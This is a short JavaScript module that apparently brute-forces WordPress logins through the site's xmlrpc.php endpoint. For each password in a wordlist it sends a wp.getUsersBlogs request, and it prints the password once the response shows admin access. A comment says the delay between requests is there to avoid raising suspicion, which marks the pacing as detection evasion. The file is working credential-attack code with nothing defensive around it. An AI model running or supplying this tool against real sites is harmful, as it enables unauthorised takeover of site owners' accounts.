const axios = require('axios')
const wait = require('waait')
const player = require('play-sound')((opts = {}))

const TIMEOUT = 20

// Make asynchronous POST request to xmlrpc.php
const login = async (url, username, password) => {
  try {
    return await axios({
      method: 'post',
      url: url,
      headers: {
        'Content-Type': 'text/plain'
      },
      data: `<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>${username}</value></param><param><value>${password}</value></param></params></methodCall>`
    })
  } catch (error) {
    console.error(error)
  }
}

// Let's us use async inside a forEach loop
const asyncForEach = async (array, callback) => {
  for (let index = 0; index < array.length; index++) {
    await callback(array[index], index, array)
  }
}

const attack = async (url, username, wordlist) => {
  console.log('\n[i] Starting brute-force attack')

  // Transform wordlist buffer to Array
  const passwords = wordlist.toString().split('\n')

  const target = `${url}/xmlrpc.php`

  await asyncForEach(passwords, async password => {
    // Wait 0.5sec before each request, so we don't cause any suspicious performance problems
    await wait(TIMEOUT)

    const result = await login(target, username, password)

    if (result.data.includes('403')) {
      console.log(`[i] Trying ${username} / ${password}`)
    } else if (result.data.includes('isAdmin')) {
      player.play('success.mp3', function(err) {
        if (err) throw err
      })
      console.log(`\n[✓] Password found for ${username}: ${password}`)
      process.exit(0)
    }
  })
  console.log(`[✘] No password found for user ${username}`)
}

module.exports = attack
